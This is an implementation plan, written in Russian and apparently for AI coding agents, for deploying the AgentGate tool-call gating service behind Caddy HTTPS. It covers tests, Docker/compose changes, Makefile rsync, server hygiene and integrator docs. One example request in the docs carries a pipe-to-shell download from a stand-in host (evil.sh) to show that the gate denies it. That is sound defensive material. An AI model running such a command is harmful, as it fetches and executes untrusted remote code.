# Деплой v1.5 как общий эндпоинт — план реализации

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Выкатить `main` на `109.172.95.51` за HTTPS-именем `109.172.95.51.sslip.io`, закрыть Postgres снаружи, показать ревизию в `/healthz`, дать команде страницу «как подключиться».

**Architecture:** Caddy как reverse proxy в compose-оверлее только для сервера; `GIT_SHA` идёт из `make deploy` через build-arg в `Settings` и в ответ `/healthz`; rsync берёт исключения из `.gitignore`. Спека: `docs/superpowers/service/specs/2026-09-04-deploy-public-endpoint-design.md`.

**Tech Stack:** Python 3.12, FastAPI, pydantic-settings, Docker Compose v5, Caddy 2, rsync, GNU make.

**Правила:** коммит только `git commit --only <пути>`; `service/.env` не читать и не коммитить; код и комментарии на английском, документация на русском. Все команды из `service/`, если не сказано иначе.

---

### Task 1: `git_sha` в Settings и в `/healthz`

**Files:**
- Modify: `service/agentgate/config.py` (класс `Settings`)
- Modify: `service/agentgate/api/responses.py` (класс `Health`)
- Modify: `service/agentgate/api/app.py` (функция `healthz`)
- Test: `service/tests/test_config.py`, `service/tests/api/test_app.py`

- [x] **Step 1: Failing test для нормализации в Settings**

В конец `tests/test_config.py`:

```python
def test_git_sha_defaults_to_none(monkeypatch):
    monkeypatch.setenv("AGENTGATE_DB_URL", "postgresql+asyncpg://u:p@localhost/agentgate")
    assert Settings().git_sha is None


def test_git_sha_empty_string_is_none(monkeypatch):
    monkeypatch.setenv("AGENTGATE_DB_URL", "postgresql+asyncpg://u:p@localhost/agentgate")
    monkeypatch.setenv("AGENTGATE_GIT_SHA", "")
    assert Settings().git_sha is None


def test_git_sha_is_read_from_env(monkeypatch):
    monkeypatch.setenv("AGENTGATE_DB_URL", "postgresql+asyncpg://u:p@localhost/agentgate")
    monkeypatch.setenv("AGENTGATE_GIT_SHA", "abc123")
    assert Settings().git_sha == "abc123"
```

- [x] **Step 2: Убедиться, что падает**

Run: `uv run pytest tests/test_config.py -q -k git_sha`
Expected: 3 failed, `AttributeError: 'Settings' object has no attribute 'git_sha'`.

- [x] **Step 3: Реализация в Settings**

В `agentgate/config.py` после `api_key_cache_ttl_seconds: float = 45.0` добавить:

```python
    # Full commit SHA the image was built from (Dockerfile ARG GIT_SHA ->
    # ENV AGENTGATE_GIT_SHA). None for a build without the argument.
    git_sha: str | None = None

    @field_validator("git_sha")
    @classmethod
    def _blank_git_sha_is_none(cls, value: str | None) -> str | None:
        # A compose build-arg that was not supplied arrives as "", not unset.
        return value or None
```

- [x] **Step 4: Тесты Settings зелёные**

Run: `uv run pytest tests/test_config.py -q`
Expected: all passed.

- [x] **Step 5: Failing test для `/healthz`**

В `tests/api/test_app.py` расширить `build()`: добавить параметр `git_sha=None` и передать его в `Settings(...)`:

```python
def build(tmp_path, token=None, bind="127.0.0.1:8400", classifier=None, db_ok=True,
          gate=None, key_repo=None, sessions_broken=False, git_sha=None):
    settings = Settings(db_url="postgresql+asyncpg://x", token=token, bind=bind,
                        log_path=tmp_path / "d.jsonl", git_sha=git_sha)
```

После `test_healthz_needs_no_token` добавить:

```python
async def test_healthz_reports_git_sha_from_settings(tmp_path):
    app, _, _, _ = build(tmp_path, git_sha="0123456789abcdef0123456789abcdef01234567")
    r = await call(app, "GET", "/healthz")
    assert r.json()["git_sha"] == "0123456789abcdef0123456789abcdef01234567"


async def test_healthz_git_sha_is_null_when_unset(tmp_path):
    app, _, _, _ = build(tmp_path)
    r = await call(app, "GET", "/healthz")
    assert "git_sha" in r.json() and r.json()["git_sha"] is None
```

- [x] **Step 6: Убедиться, что падает**

Run: `uv run pytest tests/api/test_app.py -q -k git_sha`
Expected: 2 failed (`KeyError: 'git_sha'`).

- [x] **Step 7: Реализация в Health и app**

`agentgate/api/responses.py`, в `Health` после поля `llm`:

```python
    git_sha: str | None = Field(
        description=(
            "Full commit SHA the running image was built from; `null` when the image "
            "was built without it (local builds)."
        )
    )
```

`agentgate/api/app.py`, в `healthz`: докстринг дополнить фразой `git_sha` is the commit the image was built from, or `null`; последнюю строку заменить на:

```python
        return Health(status="ok" if db_ok else "degraded", db=db_ok, llm=None, git_sha=settings.git_sha)
```

- [x] **Step 8: Зелёные тесты API**

Run: `uv run pytest tests/api/test_app.py tests/test_config.py -q`
Expected: all passed.

- [x] **Step 9: Перегенерировать контракты, проверить их тест**

Run:
```
uv run python scripts/export_openapi.py
uv run pytest tests/test_contracts.py -q
git -C .. diff --stat contracts/
```
Expected: тест зелёный, в диффе только `contracts/openapi.yaml` с новым полем `git_sha` в схеме `Health`.

- [x] **Step 10: Commit**

```bash
cd .. && git commit --only service/agentgate/config.py service/agentgate/api/responses.py service/agentgate/api/app.py service/tests/test_config.py service/tests/api/test_app.py contracts/openapi.yaml -m "feat(service): /healthz reports the commit the image was built from

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 2: Dockerfile, compose, Caddy

**Files:**
- Modify: `service/Dockerfile`
- Modify: `service/docker-compose.yml`
- Create: `service/docker-compose.deploy.yml`
- Create: `service/deploy/Caddyfile`

- [x] **Step 1: Dockerfile принимает GIT_SHA**

После строки `ENV AGENTGATE_BIND=...` добавить:

```dockerfile
ARG GIT_SHA=
ENV AGENTGATE_GIT_SHA=$GIT_SHA
```

- [x] **Step 2: compose: build-arg и Postgres только на loopback**

В `docker-compose.yml` заменить `ports: ["5433:5432"]` на `ports: ["127.0.0.1:5433:5432"]`, а `build: .` на:

```yaml
    build:
      context: .
      args:
        GIT_SHA: ${GIT_SHA:-}
```

- [x] **Step 3: Оверлей для сервера**

`service/docker-compose.deploy.yml`:

```yaml
# Server-only overlay: `docker compose -f docker-compose.yml -f docker-compose.deploy.yml`.
# Adds Caddy as the TLS terminator in front of `gate`. Local development
# uses docker-compose.yml alone and never starts Caddy.
services:
  caddy:
    image: caddy:2
    restart: unless-stopped
    depends_on: [gate]
    environment:
      AGENTGATE_PUBLIC_HOST: ${AGENTGATE_PUBLIC_HOST:?set AGENTGATE_PUBLIC_HOST in .env (the public DNS name Caddy serves)}
    ports: ["80:80", "443:443"]
    volumes:
      - "./deploy/Caddyfile:/etc/caddy/Caddyfile:ro"
      - "caddydata:/data"
volumes:
  caddydata: {}
```

- [x] **Step 4: Caddyfile**

`service/deploy/Caddyfile`:

```
{$AGENTGATE_PUBLIC_HOST} {
	reverse_proxy gate:8400
}
```

- [x] **Step 5: Проверить конфигурацию локально**

Run:
```
AGENTGATE_TOKEN=x AGENTGATE_PUBLIC_HOST=example.test GIT_SHA=deadbeef docker compose -f docker-compose.yml -f docker-compose.deploy.yml config | grep -E "GIT_SHA|127.0.0.1:5433|AGENTGATE_PUBLIC_HOST|caddy:2|443"
```
Expected: строки с `GIT_SHA: deadbeef`, `host_ip: 127.0.0.1` / `5433`, `AGENTGATE_PUBLIC_HOST: example.test`, `image: caddy:2`, `443`.

Run: `AGENTGATE_TOKEN=x docker compose config >/dev/null && echo base-ok`
Expected: `base-ok` (базовый compose без оверлея не требует `AGENTGATE_PUBLIC_HOST`).

- [x] **Step 6: Commit**

```bash
cd .. && git commit --only service/Dockerfile service/docker-compose.yml service/docker-compose.deploy.yml service/deploy/Caddyfile -m "feat(deploy): Caddy in front of gate, Postgres on loopback, GIT_SHA into the image

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 3: Makefile

**Files:**
- Modify: `service/Makefile`

- [x] **Step 1: Переменная COMPOSE и GIT_SHA**

После `HEALTHZ_PORT ?= 8400` добавить:

```make
# Server-side compose invocation: the base file plus the server-only
# overlay (Caddy). Every remote target goes through this so nobody runs
# `docker compose` on the server with only half the stack.
COMPOSE := docker compose -f docker-compose.yml -f docker-compose.deploy.yml
```

- [x] **Step 2: rsync по .gitignore**

Заменить блок `rsync -az --delete ... ./ $(DEPLOY_HOST):$(DEPLOY_DIR)/` на:

```make
	rsync -az --delete \
		--filter=':- .gitignore' \
		--exclude='.env' \
		--exclude='.previous_gate_image' \
		./ $(DEPLOY_HOST):$(DEPLOY_DIR)/
```

Комментарий над ним (заменить старый список в комментарии `make deploy:` шаг 2):

```make
#   2. rsync the committed service/ tree to the server. Exclusions come
#      from .gitignore (one list, not three); two stay explicit: `.env`
#      because the server's secrets must survive even if someone edits
#      .gitignore, and `.previous_gate_image` because it is not ignored
#      and `--delete` would remove the rollback pointer.
```

- [x] **Step 3: GIT_SHA и COMPOSE в deploy**

Заменить ssh-блок сборки на:

```make
	ssh $(DEPLOY_HOST) 'set -e; cd $(DEPLOY_DIR) && \
		PREV_IMAGE=$$($(COMPOSE) images -q gate 2>/dev/null || true); \
		if [ -n "$$PREV_IMAGE" ]; then echo "$$PREV_IMAGE" > .previous_gate_image; fi; \
		GIT_SHA=$(shell git rev-parse HEAD) $(COMPOSE) up -d --build && \
		$(COMPOSE) exec -T gate uv run alembic upgrade head'
```

- [x] **Step 4: Внешняя проверка по HTTPS**

Внутри ветки `echo "==> deploy OK"` заменить на:

```make
		echo "==> deploy OK on the server; checking from here over HTTPS"; \
		PUBLIC_HOST=$$(ssh $(DEPLOY_HOST) "sed -n 's/^AGENTGATE_PUBLIC_HOST=//p' $(DEPLOY_DIR)/.env"); \
		curl -fsS "https://$$PUBLIC_HOST/healthz" && echo && echo "==> https://$$PUBLIC_HOST is up"; \
```

- [x] **Step 5: logs, ps, rollback через COMPOSE**

Во всех трёх целях `docker compose` → `$(COMPOSE)`.

- [x] **Step 6: Синтаксис и dry run**

Run: `make -n deploy | head -30`
Expected: команды печатаются без ошибок make, в них видны `--filter=':- .gitignore'` и `GIT_SHA=<40 hex>`.

Run: `rsync -azn --delete --filter=':- .gitignore' --exclude='.env' --exclude='.previous_gate_image' -v ./ agentgate:/opt/agentgate/ | grep -E "^\.env|previous_gate|\.venv|__pycache__|\.pytest_cache|deleting" | head`
Expected: строк `.env`, `.previous_gate_image`, `.venv`, кэшей нет; строки `deleting docker-compose.yml.bak` и `deleting agentgate/pipeline.py` есть (старый код уезжает).

- [x] **Step 7: Commit**

```bash
cd .. && git commit --only service/Makefile -m "feat(deploy): rsync by .gitignore, GIT_SHA into the build, HTTPS check after deploy

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 4: Гигиена (локально и на сервере)

**Files:** нет изменений в репозитории.

- [x] **Step 1: Переименовать ключ в локальном .env, не читая его**

Run:
```
sed -i '' 's/^TOKEN=/AGENTGATE_TOKEN=/' .env && grep -c '^AGENTGATE_TOKEN=' .env && grep -c '^TOKEN=' .env
```
Expected: `1` затем `0` (второй grep завершится кодом 1, это нормально).

- [x] **Step 2: Публичное имя в серверный .env**

Run:
```
ssh agentgate 'grep -q "^AGENTGATE_PUBLIC_HOST=" /opt/agentgate/.env || echo "AGENTGATE_PUBLIC_HOST=109.172.95.51.sslip.io" >> /opt/agentgate/.env; grep -c "^AGENTGATE_PUBLIC_HOST=" /opt/agentgate/.env'
```
Expected: `1`.

- [x] **Step 3: Удалить лишний ключ на сервере**

Run:
```
ssh agentgate 'sed -i "/agentgate-deploy@/d" /root/.ssh/authorized_keys; grep -c agentgate-deploy /root/.ssh/authorized_keys'
```
Expected: `0` (grep вернёт код 1).

- [x] **Step 4: Удалить локальную пару и проверить вход**

Run:
```
rm ~/.ssh/agentgate_deploy ~/.ssh/agentgate_deploy.pub && ssh -o BatchMode=yes agentgate 'echo ssh-ok'
```
Expected: `ssh-ok`.

---

### Task 5: Документация

**Files:**
- Create: `docs/connect.md`
- Modify: `docs/superpowers/service/specs/deploy.md` (раздел «Состояние»)
- Modify: `CLAUDE.md` (корень)

- [x] **Step 1: docs/connect.md**

```markdown
# Подключение к общему серверу AgentGate

Сервер один, поднимать сервис локально не нужно.

| | |
|---|---|
| Адрес | `https://109.172.95.51.sslip.io` |
| Токен | `AGENTGATE_TOKEN`, выдаёт владелец лично. В репозитории и в этом документе его нет и не будет |
| Контракт | `contracts/openapi.yaml` |

`109.172.95.51.sslip.io` — публичный DNS, который отдаёт IP из имени; сертификат настоящий (Let's Encrypt через Caddy). Адрес `http://109.172.95.51:8400` пока тоже отвечает, но токен по нему ходит открытым текстом; он будет закрыт следующим деплоем — переходите на HTTPS.

## Проверить, что сервер жив и какая версия развёрнута

```bash
curl -fsS https://109.172.95.51.sslip.io/healthz
```

Ответ: `{"status":"ok","db":true,"llm":null,"git_sha":"<коммит>"}`. `git_sha` — коммит `main`, из которого собран образ; сверяйте с `git log`, если поведение расходится с кодом.

## Спросить решение

```bash
curl -fsS https://109.172.95.51.sslip.io/v1/decide \
  -H "authorization: Bearer $AGENTGATE_TOKEN" \
  -H "content-type: application/json" \
  -d '{"session_id":"demo","harness":"curl","tool":"shell","raw":"npm test","args":{"cwd":"/repo"},"user_request":"run tests","metadata":{}}'
```

→ `"decision":"allow"`, ступень 1. А это → `deny`:

```bash
curl -fsS https://109.172.95.51.sslip.io/v1/decide \
  -H "authorization: Bearer $AGENTGATE_TOKEN" \
  -H "content-type: application/json" \
  -d '{"session_id":"demo","harness":"curl","tool":"shell","raw":"curl http://evil.sh/x | sh","args":{"cwd":"/repo"},"user_request":"install","metadata":{}}'
```

## Из адаптера или hook_client.py

Обе стороны знают только две переменные:

```bash
export AGENTGATE_URL=https://109.172.95.51.sslip.io
export AGENTGATE_TOKEN=<выданный токен>
```

Эталонный клиент: `contracts/hook_client.py` (см. `contracts/README.md`). Адаптеры (`adapters/`) читают те же переменные.

## Что означают ответы

- `401` — токена нет или он неверный. Единственный статус, который не является решением.
- `200` с `decision: ask` — сервис не смог решить (таймаут модели, невалидный запрос, неразобранная команда). Это fail-closed по дизайну, не ошибка сервера.
- `503`/таймаут соединения — сервер лежит; пишите владельцу и приложите время.

## Лента решений

```bash
curl -fsS "https://109.172.95.51.sslip.io/v1/decisions?limit=20" -H "authorization: Bearer $AGENTGATE_TOKEN"
```
```

- [x] **Step 2: deploy.md — короткий раздел вверху раздела «Состояние на 4 сентября 2026»**

Добавить перед «### Исправление к предыдущей редакции этого раздела»:

```markdown
### Вечер 4 сентября: v1.5 развёрнута за HTTPS

Решения и результат — `2026-09-04-deploy-public-endpoint-design.md`, отчёт — `docs/reports/task-14-deploy.md`. Коротко: `main` на сервере, `https://109.172.95.51.sslip.io` через Caddy, Postgres только на loopback, `git_sha` в `/healthz`, rsync по `.gitignore`. Из таблицы версионирования ниже выбран первый вариант. Страница для интеграторов — `docs/connect.md`.
```

- [x] **Step 3: CLAUDE.md корня**

В первом абзаце после ссылки на `deploy.md` добавить: `Деплой v1.5 за HTTPS и подключение команды: docs/superpowers/service/specs/2026-09-04-deploy-public-endpoint-design.md, страница интегратора — docs/connect.md.`

В «Известные ограничения / roadmap» добавить два пункта:

```markdown
- **Порт 8400 всё ещё открыт по HTTP** параллельно с HTTPS через Caddy — до тех пор, пока интеграторы не перейдут на `https://109.172.95.51.sslip.io`. Закрыть — одна строка в `docker-compose.yml` (`127.0.0.1:8400:8400`) и следующий `make deploy`.
- **Имя `*.sslip.io` не в Public Suffix List**: недельный лимит Let's Encrypt общий на всех его пользователей; Caddy сам падает на ZeroSSL. Если и он откажет — купить домен, A-запись на сервер, поменять `AGENTGATE_PUBLIC_HOST` в серверном `.env`.
```

- [x] **Step 4: Commit**

```bash
git commit --only docs/connect.md docs/superpowers/service/specs/deploy.md CLAUDE.md -m "docs: how to connect to the shared server, deploy state for 4 September

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 6: Деплой и приёмка

- [x] **Step 1: Полный прогон тестов и чистое дерево**

Run: `uv run pytest -q && git status --porcelain -- .`
Expected: тесты зелёные (тесты с базой пропущены без `AGENTGATE_TEST_DB_URL`), вывод `git status` пустой.

- [x] **Step 2: Деплой**

Run: `make deploy 2>&1 | tail -25`
Expected: заканчивается строками `==> deploy OK on the server...`, JSON `/healthz` и `==> https://109.172.95.51.sslip.io is up`. Первый запрос по HTTPS может ждать выпуска сертификата до минуты; если `curl` упал по TLS — повторить через 30 секунд вручную, прежде чем считать деплой неуспешным.

- [x] **Step 3: Приёмка из спеки, раздел 6**

Run:
```
echo "1:"; curl -fsS https://109.172.95.51.sslip.io/healthz; echo; git rev-parse HEAD
echo "3:"; nc -z -w 4 109.172.95.51 5433 && echo "PG OPEN (BAD)" || echo "pg closed"
echo "4:"; curl -fsS http://109.172.95.51:8400/healthz; echo
echo "5:"; ssh agentgate 'cat /opt/agentgate/.previous_gate_image; ls /opt/agentgate/agentgate | grep -c engine; ls /opt/agentgate/docker-compose.yml.bak 2>&1'
```
Expected: `git_sha` равен HEAD; `pg closed`; 8400 отвечает; `.previous_gate_image` есть; `engine` есть; `.bak` отсутствует.

Пункт 2 (decide по HTTPS с токеном) выполняет владелец с его токеном, либо агент при наличии `AGENTGATE_TOKEN` в окружении — команды в `docs/connect.md`.

- [x] **Step 4: Отчёт**

Создать `docs/reports/task-14-deploy.md` по правилу проекта: что построено, доказательства TDD (падавшие и прошедшие тесты), находки (Postgres наружу, старый код), решения владельца, что отложено (8400, ротация паролей, ключи). Commit:

```bash
git commit --only docs/reports/task-14-deploy.md -m "docs(report): task 14, deploy v1.5 as the shared endpoint

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```
